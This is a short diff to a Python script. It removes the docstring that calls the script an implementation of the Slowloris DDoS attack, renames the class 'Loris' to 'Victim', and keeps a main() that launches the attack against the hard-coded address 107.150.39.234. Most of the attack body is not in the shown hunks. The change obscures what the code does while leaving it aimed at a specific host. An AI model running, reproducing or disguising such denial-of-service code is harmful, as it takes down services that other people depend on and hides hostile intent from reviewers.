@@ -2,11 +2,9 @@ import socket
 import threading
 import time
 
-"""
-An implementation of the slowloris DDoS attack.
-"""
 
-class Loris:
+
+class Victim:
     def __init__(self, addr, port = 80):
         self.addr = addr
         self.port = port
@@ -134,8 +132,8 @@ class Loris:
             time.sleep(self.timeout)
 
 def main():
-    l = Loris("107.150.39.234")
-    l.initiateAttack()
+    v = Victim("107.150.39.234")
+    v.initiateAttack()
 
 if __name__ == "__main__":
     main()
